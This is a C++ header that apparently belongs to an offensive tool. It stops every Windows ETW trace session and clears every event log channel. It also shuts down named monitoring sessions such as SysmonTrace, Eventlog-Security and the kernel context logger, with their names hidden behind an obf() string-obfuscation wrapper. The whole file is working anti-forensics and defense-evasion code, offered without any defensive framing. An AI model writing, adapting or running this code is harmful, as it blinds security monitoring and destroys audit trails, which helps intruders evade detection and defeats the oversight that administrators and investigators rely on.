#pragma once
#include <evntrace.h>

namespace events {
    //inline bool starts_with_icase( const wchar_t* str, const wchar_t* prefix ) {
    //    if ( !str || !prefix )
    //        return false;

    //    while ( *prefix ) {
    //        if ( !*str || towlower( *str ) != towlower( *prefix ) )
    //            return false;
    //        ++str;
    //        ++prefix;
    //    }
    //    return true;
    //}

    std::size_t clear_events( ) {
        constexpr ULONG max_sessions = 256;
        constexpr ULONG name_chars = 1024;
        constexpr ULONG file_chars = 1024;
        constexpr ULONG props_size = sizeof( EVENT_TRACE_PROPERTIES ) + ( name_chars + file_chars ) * sizeof( wchar_t );

        std::vector<std::vector<BYTE>> buffers( max_sessions );
        std::vector<PEVENT_TRACE_PROPERTIES> traces( max_sessions );

        for ( ULONG i = 0; i < max_sessions; ++i ) {
            buffers[ i ].resize( props_size );

            auto* props = reinterpret_cast< EVENT_TRACE_PROPERTIES* >( buffers[ i ].data( ) );
            props->Wnode.BufferSize = props_size;
            props->LoggerNameOffset = sizeof( EVENT_TRACE_PROPERTIES );
            props->LogFileNameOffset = sizeof( EVENT_TRACE_PROPERTIES ) + name_chars * sizeof( wchar_t );
            traces[ i ] = props;
        }

        ULONG logger_count = max_sessions;
        const auto query_status = QueryAllTracesW( traces.data( ), max_sessions, &logger_count );
        if ( query_status != ERROR_SUCCESS && query_status != ERROR_MORE_DATA )
            return 0;

        std::size_t cleared = 0;
        const auto count = logger_count < max_sessions ? logger_count : max_sessions;
        for ( ULONG i = 0; i < count; ++i ) {
            auto* props = traces[ i ];
            const auto* name = reinterpret_cast< const wchar_t* >( reinterpret_cast< const BYTE* >( props ) + props->LoggerNameOffset );

            const auto status = ControlTraceW( 0, name, props, EVENT_TRACE_CONTROL_STOP );
            if ( status == ERROR_SUCCESS || status == ERROR_WMI_INSTANCE_NOT_FOUND )
                ++cleared;
        }

        return cleared;
    }

    bool clear_session( const std::wstring& name ) {
        auto name_chars = name.size( ) + 1;
        auto name_bytes = name_chars * sizeof( wchar_t );
        auto struct_size = sizeof( EVENT_TRACE_PROPERTIES );
        auto buf_size = struct_size + name_bytes;

        auto props_buf = std::vector<std::uint8_t>( buf_size, 0 );
        auto props = reinterpret_cast< PEVENT_TRACE_PROPERTIES >( props_buf.data( ) );
        props->Wnode.BufferSize = static_cast< ULONG >( buf_size );
        props->LoggerNameOffset = sizeof( EVENT_TRACE_PROPERTIES );

        auto status = StopTraceW( 0, name.c_str( ), props );
        return ( status == ERROR_SUCCESS || status == ERROR_WMI_INSTANCE_NOT_FOUND );
    }

    void clean_sessions( ) {
        // Each obf() call produces a unique encryptor type — they cannot share
        // an initializer_list. Use a typed helper to accept wchar_t* (one
        // user-defined conversion from encryptor) and forward to clear_session.
        const auto do_clear = []( const wchar_t* s ) {
            clear_session( std::wstring( s ) );
        };
        do_clear( obf( L"Circular Kernel Context Logger" ) );
        do_clear( obf( L"NtfsLog" ) );
        do_clear( obf( L"DiagLog" ) );
        do_clear( obf( L"WdiContextLog" ) );
        do_clear( obf( L"WdiDiagnosticLog" ) );
        do_clear( obf( L"LwtNetLog" ) );
        do_clear( obf( L"Microsoft-Windows-Setup" ) );
        do_clear( obf( L"ReadyBoot" ) );
        do_clear( obf( L"WFP-IPsec Trace" ) );
        do_clear( obf( L"NOCAT" ) );
        do_clear( obf( L"Eventlog-Security" ) );
        do_clear( obf( L"SysmonTrace" ) );
        do_clear( obf( L"AutoLogger-Diagtrack-Listener" ) );
    }

    bool clear_channel( const std::wstring& channel ) {
        if ( channel.empty( ) ) return false;
        if ( !EvtClearLog( nullptr, channel.c_str( ), nullptr, 0 ) )
            return false;
        return true;
    }

    std::vector< std::wstring > enum_channels( ) {
        std::vector< std::wstring > Result;
        const auto Enum = EvtOpenChannelEnum( nullptr, 0 );
        if ( !Enum ) return Result;

        DWORD BufSize = 256;
        std::vector< wchar_t > Buf( BufSize );
        DWORD Used{};

        while ( true ) {
            if ( EvtNextChannelPath( Enum, BufSize, Buf.data( ), &Used ) ) {
                Result.emplace_back( Buf.data( ) );
            } else {
                const auto Err = GetLastError( );
                if ( Err == ERROR_INSUFFICIENT_BUFFER ) {
                    BufSize = Used;
                    Buf.resize( BufSize );
                    continue;
                }
                break;
            }
        }

        EvtClose( Enum );
        return Result;
    }

    std::uint32_t clear_channels( ) {
        DWORD cleared{};
        const auto channels = enum_channels( );
        for ( const auto& channel : channels )
            if ( clear_channel( channel ) ) ++cleared;
        return cleared;
    }
}